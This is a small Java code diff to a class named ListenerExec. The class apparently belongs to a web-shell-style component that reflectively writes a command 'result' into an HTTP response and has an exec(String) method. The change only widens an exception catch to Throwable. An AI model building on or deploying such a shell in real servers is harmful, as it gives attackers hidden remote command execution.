@@ -58,7 +58,7 @@ public class ListenerExec implements InvocationHandler {
             invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
             Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
             invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
-        } catch (Exception ignored) {
+        } catch (Throwable ignored) {
         }
     }
     public static String exec(String str) throws Exception {
